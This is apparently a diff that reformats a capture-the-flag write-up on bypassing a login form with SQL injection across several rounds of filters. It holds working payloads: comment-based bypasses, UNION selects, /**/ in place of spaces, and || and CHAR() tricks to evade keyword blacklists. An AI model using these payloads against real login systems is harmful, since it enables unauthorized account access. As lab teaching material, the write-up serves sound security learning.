@@ -9,8 +9,9 @@ In this challenge, we are linked to a login form we are meant to bypass with SQL
 
 Use basic injection and comment out the rest of the line.
 
+input: `admin'--`
+
 ```sql
-input: admin'--
 SELECT * FROM users WHERE username='admin'--' AND password='a'
 ```
 
@@ -18,11 +19,15 @@ SELECT * FROM users WHERE username='admin'--' AND password='a'
 
 Without `--`, check for other ways to comment. We can also use UNION to get our specific user.
 
-```sql
-input: admin'/*
-SELECT * FROM users WHERE username='admin'/*' AND password='a'
+input: `admin'/*`
 
-input: ' union select * from users where username in("admin")/*
+```sql
+SELECT * FROM users WHERE username='admin'/*' AND password='a'
+```
+
+input: `' union select * from users where username in("admin")/*`
+
+```sql
 SELECT * FROM users WHERE username='' union select * from users where username in("admin")/* AND password='a'
 ```
 
@@ -30,11 +35,15 @@ SELECT * FROM users WHERE username='' union select * from users where username i
 
 The first injection from the previous round still works here, but let's try to get the second to work too. Spaces are now blocked, but we can use `/**/` comments for the same effect. I tried %20 to replace all the spaces, but it was not effective.
 
-```sql
-input: admin'/*
-SELECT * FROM users WHERE username='admin'/*' AND password='a'
+input: `admin'/*`
 
-input: '/**/union/**/select*from/**/users/**/where/**/username/**/in("admin")/*
+```sql
+SELECT * FROM users WHERE username='admin'/*' AND password='a'
+```
+
+input: `'/**/union/**/select*from/**/users/**/where/**/username/**/in("admin")/*`
+
+```sql
 SELECT * FROM users WHERE username=''/**/union/**/select*from/**/users/**/where/**/username/**/in("admin")/*' AND password='a'
 ```
 
@@ -42,11 +51,15 @@ SELECT * FROM users WHERE username=''/**/union/**/select*from/**/users/**/where/
 
 In SQLITE, `||` is a concatenation operator. The simple solution is to simply split up "admin" in a way to bypass the filter. A more complicated solution could include encoding encode "admin" in ASCII number code and using the SQL `CHAR()` function to decode it.
 
-```sql
-input: adm'||'in'/*
-SELECT * FROM users WHERE username='adm'||'in'/* AND password='a'
+input: `adm'||'in'/*`
 
-input: '/**/union/**/select*from/**/users/**/where/**/username/**/in(char(97,100,109,105,110))/*
+```sql
+SELECT * FROM users WHERE username='adm'||'in'/* AND password='a'
+```
+
+input: `'/**/union/**/select*from/**/users/**/where/**/username/**/in(char(97,100,109,105,110))/*`
+
+```sql
 SELECT * FROM users WHERE username=''/**/union/**/select*from/**/users/**/where/**/username/**/in(char(97,100,109,105,110))/*' AND password='a'
 ```
 
@@ -54,8 +67,9 @@ SELECT * FROM users WHERE username=''/**/union/**/select*from/**/users/**/where/
 
 Splitting up "admin" still works as only UNION is additionally blacklisted.
 
+input: `adm'||'in'/*`
+
 ```sql
-input: adm'||'in'/*
 SELECT * FROM users WHERE username='adm'||'in'/* AND password='a'
 ```
 
